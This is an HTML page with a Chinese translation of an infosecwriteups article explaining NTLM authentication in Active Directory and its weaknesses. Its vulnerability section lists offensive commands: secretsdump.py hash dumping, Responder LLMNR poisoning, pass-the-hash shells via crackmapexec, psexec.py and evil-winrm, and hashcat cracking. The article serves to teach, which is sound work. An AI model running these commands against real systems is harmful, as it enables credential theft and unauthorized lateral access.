<html>
<head>
<title>NTLM Authentication in Active Directory</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">活动目录中的NTLM身份验证</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/ntlm-authentication-in-active-directory-b99ea9087519?source=collection_archive---------1-----------------------#2022-06-12">https://infosecwriteups.com/ntlm-authentication-in-active-directory-b99ea9087519?source=collection_archive---------1-----------------------#2022-06-12</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div class="gh gi jn"><img src="../Images/ddc65f0be406ed923fac7946bfabb477.png" data-original-src="https://miro.medium.com/v2/resize:fit:1310/format:webp/1*ldzSfNPCX2hyvsMq0bq_Pg.png"/></div></figure><p id="6947" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">本文概述了新技术LAN Manager (NTLM)认证的工作原理。在本文中，我们将探讨NTLM身份验证的基本功能，以及如何在Active Directory中使用它。NTLM认证是一个很大的话题，本文将只涵盖基础知识，所以说，让我们深入！</p></div><div class="ab cl ks kt hu ku" role="separator"><span class="kv bw bk kw kx ky"/><span class="kv bw bk kw kx ky"/><span class="kv bw bk kw kx"/></div><div class="ij ik il im in"><h1 id="b108" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">什么是NTLM？</h1><p id="02cf" class="pw-post-body-paragraph ju jv iq jw b jx lx jz ka kb ly kd ke kf lz kh ki kj ma kl km kn mb kp kq kr ij bi translated">在我的上一篇题为“<a class="ae mc" rel="noopener ugc nofollow" target="_blank" href="/kerberos-authentication-in-active-directory-2dc4af232f65"> <em class="md">活动目录中的Kerberos身份验证</em> </a>”的文章中，我提到了活动目录中另一种主要的身份验证类型是NTLM。<a class="ae mc" href="https://docs.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview" rel="noopener ugc nofollow" target="_blank">微软</a>这样描述NTLM:</p><blockquote class="me mf mg"><p id="ffe5" class="ju jv md jw b jx jy jz ka kb kc kd ke mh kg kh ki mi kk kl km mj ko kp kq kr ij bi translated">NTLM身份验证协议基于质询/响应机制对用户和计算机进行身份验证，该机制向服务器或域控制器证明用户知道与帐户相关联的密码。</p></blockquote><p id="598f" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">NTLM是一个<strong class="jw ir">单点登录(SSO) </strong>工具，它依靠<strong class="jw ir">挑战-响应</strong>协议用密码散列来确认用户，避免了通过网络发送无保护密码的需要。虽然NTLM仍受Microsoft支持，但它是一个过时的协议，已被Kerberos取代，成为Windows 2000和后续Active Directory (AD)域中的默认身份验证协议。</p></div><div class="ab cl ks kt hu ku" role="separator"><span class="kv bw bk kw kx ky"/><span class="kv bw bk kw kx ky"/><span class="kv bw bk kw kx"/></div><div class="ij ik il im in"><h1 id="cc05" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">为什么NTLM仍然被使用？</h1><p id="453f" class="pw-post-body-paragraph ju jv iq jw b jx lx jz ka kb ly kd ke kf lz kh ki kj ma kl km kn mb kp kq kr ij bi translated">尽管被Kerberos取代为默认身份验证协议，并且存在多个漏洞，但NTLM仍然在所有Windows系统上保留。这主要是由于以下<a class="ae mc" href="https://docs.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview#BKMK_APP" rel="noopener ugc nofollow" target="_blank">原因</a>:</p><ul class=""><li id="c1d1" class="mk ml iq jw b jx jy kb kc kf mm kj mn kn mo kr mp mq mr ms bi translated">旧客户端和服务器之间的兼容性。</li><li id="009e" class="mk ml iq jw b jx mt kb mu kf mv kj mw kn mx kr mp mq mr ms bi translated">NTLM身份验证仍然受支持，并且必须用于配置为工作组成员的系统的Windows身份验证。</li><li id="9ea9" class="mk ml iq jw b jx mt kb mu kf mv kj mw kn mx kr mp mq mr ms bi translated">NTLM身份验证用于非域控制器上的本地登录身份验证。</li></ul></div><div class="ab cl ks kt hu ku" role="separator"><span class="kv bw bk kw kx ky"/><span class="kv bw bk kw kx ky"/><span class="kv bw bk kw kx"/></div><div class="ij ik il im in"><h1 id="9be6" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">NTLM身份验证如何在AD环境中工作？</h1><p id="a82f" class="pw-post-body-paragraph ju jv iq jw b jx lx jz ka kb ly kd ke kf lz kh ki kj ma kl km kn mb kp kq kr ij bi translated">NTLM认证允许应用服务器在客户端和AD之间扮演中间人的角色。所有身份验证材料都以质询的形式转发给域控制器，如果成功完成，应用服务器将对用户进行身份验证。NTLM通过<a class="ae mc" href="https://www.crowdstrike.com/cybersecurity-101/ntlm-windows-new-technology-lan-manager/" rel="noopener ugc nofollow" target="_blank"> <strong class="jw ir">挑战应答机制</strong> </a>对用户进行认证。该过程由三条消息组成:</p><ol class=""><li id="f667" class="mk ml iq jw b jx jy kb kc kf mm kj mn kn mo kr my mq mr ms bi translated"><strong class="jw ir">来自客户端的协商消息</strong></li><li id="6e55" class="mk ml iq jw b jx mt kb mu kf mv kj mw kn mx kr my mq mr ms bi translated">来自服务器的<strong class="jw ir">挑战消息</strong></li><li id="76ec" class="mk ml iq jw b jx mt kb mu kf mv kj mw kn mx kr my mq mr ms bi translated"><strong class="jw ir">来自客户端的认证消息</strong></li></ol><p id="1a30" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">NTLM认证遵循以下<a class="ae mc" href="https://www.crowdstrike.com/cybersecurity-101/ntlm-windows-new-technology-lan-manager/" rel="noopener ugc nofollow" target="_blank">分步流程</a>:</p><ol class=""><li id="9cc0" class="mk ml iq jw b jx jy kb kc kf mm kj mn kn mo kr my mq mr ms bi translated">用户与客户端共享他们的用户名、密码和域名。</li><li id="a545" class="mk ml iq jw b jx mt kb mu kf mv kj mw kn mx kr my mq mr ms bi translated">客户端开发出一个加密的密码版本(或称哈希),然后删除完整的密码。</li><li id="af77" class="mk ml iq jw b jx mt kb mu kf mv kj mw kn mx kr my mq mr ms bi translated">客户端将用户名的纯文本版本传递给相关的应用服务器。</li><li id="2186" class="mk ml iq jw b jx mt kb mu kf mv kj mw kn mx kr my mq mr ms bi translated">应用服务器用一个16字节的随机数来回复客户机。</li><li id="5e2b" class="mk ml iq jw b jx mt kb mu kf mv kj mw kn mx kr my mq mr ms bi translated">作为响应，客户端发送由用户密码散列加密的质询。</li><li id="3629" class="mk ml iq jw b jx mt kb mu kf mv kj mw kn mx kr my mq mr ms bi translated">然后，应用服务器向域控制器(DC)发送质询、响应和用户名。</li><li id="5e7f" class="mk ml iq jw b jx mt kb mu kf mv kj mw kn mx kr my mq mr ms bi translated">DC从数据库中检索用户的密码，并使用它来加密质询。</li><li id="7a18" class="mk ml iq jw b jx mt kb mu kf mv kj mw kn mx kr my mq mr ms bi translated">然后，DC比较加密的挑战和客户端响应。如果这两部分匹配，那么用户就通过了身份验证，并被授予访问权限。</li></ol><p id="a891" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">下面的序列图说明了上面概述的步骤。</p><figure class="na nb nc nd gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="ne nf di ng bf nh"><div class="gh gi mz"><img src="../Images/5033091099a29c2628672964d82fb1b6.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bMV1ntOeHN4rz-1o2x5a1A.png"/></div></div><figcaption class="ni nj gj gh gi nk nl bd b be z dk translated">NTLM认证序列图示例。</figcaption></figure></div><div class="ab cl ks kt hu ku" role="separator"><span class="kv bw bk kw kx ky"/><span class="kv bw bk kw kx ky"/><span class="kv bw bk kw kx"/></div><div class="ij ik il im in"><h1 id="056c" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">NTLM安全漏洞</h1><p id="c744" class="pw-post-body-paragraph ju jv iq jw b jx lx jz ka kb ly kd ke kf lz kh ki kj ma kl km kn mb kp kq kr ij bi translated">NTLM是一种过时的协议，存在多个安全漏洞，可能会被攻击者利用。我提供了几个与NTLM相关的安全漏洞的例子。</p><h2 id="2e85" class="nm la iq bd lb nn no dn lf np nq dp lj kf nr ns ln kj nt nu lr kn nv nw lv nx bi translated">传递散列攻击</h2><p id="ed27" class="pw-post-body-paragraph ju jv iq jw b jx lx jz ka kb ly kd ke kf lz kh ki kj ma kl km kn mb kp kq kr ij bi translated"><a class="ae mc" href="https://www.crowdstrike.com/cybersecurity-101/pass-the-hash/" rel="noopener ugc nofollow" target="_blank">传递哈希</a>攻击是一种技术，攻击者通过这种技术获取密码哈希(与密码字符相反),然后简单地传递它以进行身份验证，并可能横向访问其他网络系统。通过使用Impacket中的“<strong class="jw ir"> secretsdump.py </strong>”等工具在受损机器上转储哈希，可以获得NTLM哈希。</p><pre class="na nb nc nd gt ny nz oa ob aw oc bi"><span id="34bf" class="nm la iq nz b gy od oe l of og">sudo python3 secretsdump.py domain/user:password@192.168.57.141</span></pre><p id="3fed" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">LLMNR中毒也可以使用<strong class="jw ir">响应器</strong>来捕获哈希。</p><pre class="na nb nc nd gt ny nz oa ob aw oc bi"><span id="5c70" class="nm la iq nz b gy od oe l of og">python3 Responder.py -I tun0 -rdwv</span></pre><figure class="na nb nc nd gt jr gh gi paragraph-image"><div class="gh gi oh"><img src="../Images/c310d7d72a775d5b9e70b3fa012a7b8d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1332/format:webp/0*VWhUjwe3GZWuYHqj.png"/></div><figcaption class="ni nj gj gh gi nk nl bd b be z dk translated">响应程序捕获的NTLMv2哈希。</figcaption></figure><p id="1927" class="pw-post-body-paragraph ju jv iq jw b jx jy jz ka kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ij bi translated">有多种工具可以用来执行pass hash攻击，包括<strong class="jw ir"> Evil-WinRM </strong>、<strong class="jw ir"> crackmapexec </strong>和<strong class="jw ir"> psexec.py </strong>。</p><pre class="na nb nc nd gt ny nz oa ob aw oc bi"><span id="42de" class="nm la iq nz b gy od oe l of og"># -H : hash<br/><strong class="nz ir">crackmapexec smb 10.0.3.0/24 -u "John" -H &lt;hash&gt; --local-auth</strong></span><span id="fa66" class="nm la iq nz b gy oi oe l of og"># Can use psexec to create shell using a hash<br/><strong class="nz ir">psexec.py "John":@192.168.57.141 -hashes &lt;hash&gt;</strong></span><span id="9f1f" class="nm la iq nz b gy oi oe l of og"># alternative tool for pass the hash attack<br/><strong class="nz ir">evil-winrm -u Administrator -H &lt;hash&gt; -i 10.10.25.158</strong></span></pre><h2 id="b6c2" class="nm la iq bd lb nn no dn lf np nq dp lj kf nr ns ln kj nt nu lr kn nv nw lv nx bi translated">过时的加密技术</h2><p id="e829" class="pw-post-body-paragraph ju jv iq jw b jx lx jz ka kb ly kd ke kf lz kh ki kj ma kl km kn mb kp kq kr ij bi translated">NTLM使用过时的加密技术，并且没有利用算法思维或加密的最新进展来提高密码的安全性。像<strong class="jw ir"> hashcat </strong>这样的工具可以用来<strong class="jw ir"> </strong>破解捕获的NTLMv2哈希，轻松取回使用密码。</p><pre class="na nb nc nd gt ny nz oa ob aw oc bi"><span id="1fe3" class="nm la iq nz b gy od oe l of og">hashcat64.exe -m 5600 hash.txt rockyou.txt</span></pre><figure class="na nb nc nd gt jr gh gi paragraph-image"><div class="gh gi oj"><img src="../Images/76be27d7cbaa48f5e4e4167e31476152.png" data-original-src="https://miro.medium.com/v2/resize:fit:1242/format:webp/0*pWOKBEfJ32WlLgib.png"/></div><figcaption class="ni nj gj gh gi nk nl bd b be z dk translated">破解的NTLMv2哈希。</figcaption></figure></div><div class="ab cl ks kt hu ku" role="separator"><span class="kv bw bk kw kx ky"/><span class="kv bw bk kw kx ky"/><span class="kv bw bk kw kx"/></div><div class="ij ik il im in"><h1 id="f70a" class="kz la iq bd lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv lw bi translated">结束语</h1><p id="6a39" class="pw-post-body-paragraph ju jv iq jw b jx lx jz ka kb ly kd ke kf lz kh ki kj ma kl km kn mb kp kq kr ij bi translated">希望这篇关于NTLM身份验证的短文有助于提供它是什么以及它如何工作的基本概述。尽管被Kerberos取代，NTLM身份验证仍然被大多数使用Active Directory的大公司广泛使用。谢谢你看完，继续黑！😄</p></div></div>    
</body>
</html>